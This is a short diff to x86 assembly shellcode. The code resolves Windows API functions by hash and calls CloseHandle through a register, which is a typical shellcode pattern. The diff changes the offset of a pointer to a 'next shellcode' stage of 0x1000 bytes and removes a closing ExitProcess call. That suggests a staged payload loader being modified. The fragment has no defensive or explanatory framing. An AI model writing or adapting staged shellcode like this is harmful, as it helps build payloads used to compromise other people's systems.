@@ -50,7 +50,7 @@ pop edx
 
 mov edi, eax
 mov ecx, [esi]
-lea edx, [edx+0x47] ;pointer on the next shellcode
+add dword edx, 0x112247   ;pointer on the next shellcode
 push esp
 push 0x00001000	;Next Shellcode Size
 push edx		;
@@ -80,7 +80,3 @@ mov ecx, [esi+0x4]
 push ecx
 push 0x528796C6
 call ebp 		;call CloseHandle()
-
-push edi
-push 0x56A2B5F0
-call ebp		;call ExitProcess(0)
